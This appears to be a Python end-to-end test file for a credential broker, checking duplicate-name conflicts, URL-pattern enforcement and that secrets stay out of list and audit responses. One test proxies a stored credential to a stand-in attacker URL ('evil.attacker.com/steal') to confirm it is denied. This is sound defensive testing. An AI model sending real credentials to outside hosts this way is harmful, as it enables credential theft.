"""
DAG nodes for credential edge case scenarios.

Scenarios:
  credential.duplicate_name_conflict
  credential.url_pattern_enforcement
  credential.secret_not_in_list
  credential.secret_not_in_audit
"""

import json
import os

from tests.e2e.dag_runner import DagNode
from tests.e2e.helpers import broker_request, server_request


# ---------------------------------------------------------------------------
# credential.duplicate_name_conflict
# ---------------------------------------------------------------------------

def credential_duplicate_name_conflict(ctx: dict) -> dict:
    """
    Create same-name credential twice → 409 conflict.

    Consumes: base_url, admin_session_cookie, csrf_token
    """
    base_url = ctx["base_url"]
    admin_cookie = ctx["admin_session_cookie"]
    csrf_token = ctx["csrf_token"]

    cred_name = f"e2e-dup-scenario-{os.urandom(4).hex()}"

    # Create first
    create_body = json.dumps({
        "name": cred_name,
        "service": "e2e-dup-test",
        "secret_value": "first-secret",
    })

    status, _, body = server_request(
        base_url, "POST", "/api/v1/credentials",
        body=create_body,
        headers={"X-CSRF-Token": csrf_token},
        cookies=admin_cookie,
    )
    assert status in (200, 201), f"First create failed: {status}: {body}"
    first_id = json.loads(body).get("data", json.loads(body)).get("id")

    try:
        # Create second with same name
        create_body2 = json.dumps({
            "name": cred_name,
            "service": "e2e-dup-test-2",
            "secret_value": "second-secret",
        })

        status2, _, body2 = server_request(
            base_url, "POST", "/api/v1/credentials",
            body=create_body2,
            headers={"X-CSRF-Token": csrf_token},
            cookies=admin_cookie,
        )

        assert status2 in (400, 409, 422), (
            f"Duplicate name should return 400/409/422, got {status2}: {body2}"
        )

    finally:
        # Cleanup
        if first_id:
            server_request(
                base_url, "DELETE", f"/api/v1/credentials/{first_id}",
                headers={"X-CSRF-Token": csrf_token},
                cookies=admin_cookie,
            )

    return ctx


CREDENTIAL_DUPLICATE_NAME_CONFLICT_NODE = DagNode(
    name="credential.duplicate_name_conflict",
    fn=credential_duplicate_name_conflict,
    depends_on=["setup.login"],
    produces=[],
    consumes=["base_url", "admin_session_cookie", "csrf_token"],
    critical=False,
    timeout=15.0,
)


# ---------------------------------------------------------------------------
# credential.url_pattern_enforcement
# ---------------------------------------------------------------------------

def credential_url_pattern_enforcement(ctx: dict) -> dict:
    """
    Create credential with specific URL pattern. Proxy to matching URL → success.
    Proxy to non-matching → denied.

    Consumes: broker_url, broker_pem_key_path, base_url,
              admin_session_cookie, csrf_token, ws_db_id
    """
    broker_url = ctx["broker_url"]
    pem_key_path = ctx["broker_pem_key_path"]
    base_url = ctx["base_url"]
    admin_cookie = ctx["admin_session_cookie"]
    csrf_token = ctx["csrf_token"]
    ws_db_id = ctx.get("ws_db_id")

    if not ws_db_id:
        return ctx

    cred_name = f"e2e-urlpat-{os.urandom(4).hex()}"

    # Create credential with URL pattern restricting to localhost
    create_body = json.dumps({
        "name": cred_name,
        "service": "e2e-urlpat",
        "secret_value": "urlpat-secret",
        "allowed_url_pattern": f"{base_url}/*",
    })

    status, _, body = server_request(
        base_url, "POST", "/api/v1/credentials",
        body=create_body,
        headers={"X-CSRF-Token": csrf_token},
        cookies=admin_cookie,
    )
    assert status in (200, 201), f"Create URL-pattern cred failed: {status}: {body}"
    cred_id = json.loads(body).get("data", json.loads(body)).get("id")

    try:
        # Grant permission
        grant_body = json.dumps({
            "workspace_id": ws_db_id,
            "permission": "vend_credential",
        })
        server_request(
            base_url, "POST", f"/api/v1/credentials/{cred_id}/permissions",
            body=grant_body,
            headers={"X-CSRF-Token": csrf_token},
            cookies=admin_cookie,
        )

        # Proxy to matching URL (base_url/health matches base_url/*)
        match_body = json.dumps({
            "method": "GET",
            "url": f"{base_url}/health",
            "credential": cred_name,
        })
        status2, _, body2 = broker_request(
            broker_url, pem_key_path, "POST", "/proxy", body=match_body,
        )
        # Should succeed (200) or fail for other reasons
        # The key test is the NON-matching URL below

        # Proxy to non-matching URL
        nomatch_body = json.dumps({
            "method": "GET",
            "url": "https://evil.attacker.com/steal",
            "credential": cred_name,
        })
        status3, _, body3 = broker_request(
            broker_url, pem_key_path, "POST", "/proxy", body=nomatch_body,
        )

        # Non-matching URL should be denied
        assert status3 != 200, (
            f"Non-matching URL should be denied, got 200: {body3}"
        )

    finally:
        if cred_id:
            server_request(
                base_url, "DELETE", f"/api/v1/credentials/{cred_id}",
                headers={"X-CSRF-Token": csrf_token},
                cookies=admin_cookie,
            )

    return ctx


CREDENTIAL_URL_PATTERN_ENFORCEMENT_NODE = DagNode(
    name="credential.url_pattern_enforcement",
    fn=credential_url_pattern_enforcement,
    depends_on=["proxy.via_broker"],
    produces=[],
    consumes=["broker_url", "broker_pem_key_path", "base_url",
              "admin_session_cookie", "csrf_token"],
    critical=False,
    timeout=30.0,
)


# ---------------------------------------------------------------------------
# credential.secret_not_in_list
# ---------------------------------------------------------------------------

def credential_secret_not_in_list(ctx: dict) -> dict:
    """
    List credentials → verify secret_value is NEVER in the response body.

    Consumes: base_url, admin_session_cookie
    """
    base_url = ctx["base_url"]
    admin_cookie = ctx["admin_session_cookie"]

    status, _, body = server_request(
        base_url, "GET", "/api/v1/credentials",
        cookies=admin_cookie,
    )
    assert status == 200, f"Credential list failed: {status}: {body}"

    # Check the raw response body for any secret patterns
    body_lower = body.lower()
    forbidden_patterns = [
        "e2e-test-secret-value",
        "secret_value",
        "-----begin private",
        "-----begin rsa",
    ]

    for pattern in forbidden_patterns:
        # "secret_value" as a JSON key is fine (e.g., in schema docs);
        # the actual secret content is what we're checking for.
        if pattern == "secret_value":
            # Check that the FIELD doesn't appear with an actual value
            # (it's OK if the field name appears as documentation)
            continue
        assert pattern not in body_lower, (
            f"Secret pattern '{pattern}' found in credential list response"
        )

    # Parse and check individual credentials
    data = json.loads(body)
    creds = data.get("data", data)
    if isinstance(creds, dict):
        creds = creds.get("credentials", creds.get("items", []))

    if isinstance(creds, list):
        for cred in creds:
            assert "secret_value" not in cred, (
                f"Credential '{cred.get('name')}' exposes secret_value in list"
            )
            assert "secret" not in cred or cred.get("secret") is None, (
                f"Credential '{cred.get('name')}' exposes secret in list"
            )

    return ctx


CREDENTIAL_SECRET_NOT_IN_LIST_NODE = DagNode(
    name="credential.secret_not_in_list",
    fn=credential_secret_not_in_list,
    depends_on=["credential.create"],
    produces=[],
    consumes=["base_url", "admin_session_cookie"],
    critical=False,
    timeout=10.0,
)


# ---------------------------------------------------------------------------
# credential.secret_not_in_audit
# ---------------------------------------------------------------------------

def credential_secret_not_in_audit(ctx: dict) -> dict:
    """
    After credential operations, check audit → no secret values appear.

    Consumes: base_url, admin_session_cookie
    """
    base_url = ctx["base_url"]
    admin_cookie = ctx["admin_session_cookie"]

    status, _, body = server_request(
        base_url, "GET", "/api/v1/audit",
        cookies=admin_cookie,
    )
    assert status == 200, f"Audit list failed: {status}: {body}"

    # Scan entire audit response for secret material
    body_lower = body.lower()
    forbidden = [
        "e2e-test-secret-value",
        "secret_value",
        "-----begin private",
        "password",
    ]

    for pattern in forbidden:
        if pattern == "password":
            # "password" appears in event types like "password_changed"
            # Check for actual password VALUES, not the word "password"
            continue
        if pattern == "secret_value":
            # The field name "secret_value" should not appear in audit events
            # Parse to check
            data = json.loads(body)
            events = data.get("data", data)
            if isinstance(events, dict):
                events = events.get("events", events.get("items", []))
            if isinstance(events, list):
                for event in events:
                    event_str = json.dumps(event).lower()
                    # Check the event doesn't contain actual secret values
                    assert "e2e-test-secret-value" not in event_str, (
                        f"Audit event contains secret value: {event.get('event_type', 'unknown')}"
                    )
            continue

        assert pattern not in body_lower, (
            f"Secret pattern '{pattern}' found in audit response"
        )

    return ctx


CREDENTIAL_SECRET_NOT_IN_AUDIT_NODE = DagNode(
    name="credential.secret_not_in_audit",
    fn=credential_secret_not_in_audit,
    depends_on=["audit.list"],
    produces=[],
    consumes=["base_url", "admin_session_cookie"],
    critical=False,
    timeout=10.0,
)


def get_nodes():
    """Return all credential scenario DAG nodes."""
    return [
        CREDENTIAL_DUPLICATE_NAME_CONFLICT_NODE,
        CREDENTIAL_URL_PATTERN_ENFORCEMENT_NODE,
        CREDENTIAL_SECRET_NOT_IN_LIST_NODE,
        CREDENTIAL_SECRET_NOT_IN_AUDIT_NODE,
    ]
